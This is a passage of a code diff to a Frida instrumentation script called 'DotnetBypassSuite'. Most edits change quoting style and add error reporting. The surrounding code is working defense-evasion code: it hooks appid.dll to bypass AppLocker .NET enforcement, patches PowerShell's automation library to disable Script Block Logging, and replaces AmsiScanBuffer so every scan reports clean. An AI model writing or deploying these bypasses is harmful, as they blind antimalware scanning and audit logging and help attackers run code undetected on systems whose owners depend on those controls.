-            
+            var matches = Memory.scanSync(Module.getBaseAddress('appid.dll'), Module.getSize('appid.dll'), pattern);
+
             matches.forEach(function(match) {
                 Interceptor.attach(match.address, {
                     onEnter: function(args) {
@@ -2031,9 +2103,9 @@ const DotnetBypassSuite = {
                         if (assemblyPath && !assemblyPath.isNull()) {
                             var path = assemblyPath.readUtf16String();
                             send({
-                                type: "info",
-                                target: "dotnet_bypass_suite",
-                                action: "applocker_dotnet_restriction_detected",
+                                type: 'info',
+                                target: 'dotnet_bypass_suite',
+                                action: 'applocker_dotnet_restriction_detected',
                                 assembly_path: path
                             });
                         }
@@ -2044,9 +2116,9 @@ const DotnetBypassSuite = {
                             retval.replace(0);
                             self.stats.appLockerDotNetScriptEnforcementBypassEvents++;
                             send({
-                                type: "bypass",
-                                target: "dotnet_bypass_suite",
-                                action: "applocker_dotnet_restriction_bypassed"
+                                type: 'bypass',
+                                target: 'dotnet_bypass_suite',
+                                action: 'applocker_dotnet_restriction_bypassed'
                             });
                         }
                     }
@@ -2055,10 +2127,10 @@ const DotnetBypassSuite = {
         });
 
         // Hook Script Block Logging bypass
-        var sblPattern = "ScriptBlockLogging";
+        var sblPattern = 'ScriptBlockLogging';
         try {
-            var sblMatches = Memory.scanSync(Module.getBaseAddress("System.Management.Automation.dll"), Module.getSize("System.Management.Automation.dll"), sblPattern);
-            
+            var sblMatches = Memory.scanSync(Module.getBaseAddress('System.Management.Automation.dll'), Module.getSize('System.Management.Automation.dll'), sblPattern);
+
             sblMatches.forEach(function(match) {
                 // Disable script block logging
                 Memory.patchCode(match.address, 4, function(code) {
@@ -2066,27 +2138,36 @@ const DotnetBypassSuite = {
                     code.putU8(0xC3); // ret
                 });
                 send({
-                    type: "bypass",
-                    target: "dotnet_bypass_suite",
-                    action: "script_block_logging_disabled",
+                    type: 'bypass',
+                    target: 'dotnet_bypass_suite',
+                    action: 'script_block_logging_disabled',
                     address: match.address.toString()
                 });
                 self.stats.appLockerDotNetScriptEnforcementBypassEvents++;
             });
-        } catch(e) {}
+        } catch(e) {
+            send({
+                type: 'debug',
+                target: 'dotnet_bypass',
+                action: 'hook_failed',
+                function: 'dotnet_bypass_suite',
+                error: e.toString(),
+                stack: e.stack || 'No stack trace available'
+            });
+        }
 
         // Hook AMSI (Antimalware Scan Interface) for .NET scripts
-        var amsiPattern = "AmsiScanBuffer";
-        var amsi = Module.findExportByName("amsi.dll", amsiPattern);
+        var amsiPattern = 'AmsiScanBuffer';
+        var amsi = Module.findExportByName('amsi.dll', amsiPattern);
         if (amsi) {
             Interceptor.replace(amsi, new NativeCallback(function(context, buffer, length, contentName, session, result) {
                 // Return clean scan result
                 result.writeU32(1); // AMSI_RESULT_CLEAN
                 self.stats.appLockerDotNetScriptEnforcementBypassEvents++;
                 send({
-                    type: "bypass",
-                    target: "dotnet_bypass_suite",
-                    action: "amsi_scan_buffer_bypassed"
+                    type: 'bypass',
+                    target: 'dotnet_bypass_suite',
+                    action: 'amsi_scan_buffer_bypassed'
                 });
                 return 0; // S_OK
             }, 'int', ['pointer', 'pointer', 'uint32', 'pointer', 'pointer', 'pointer']));
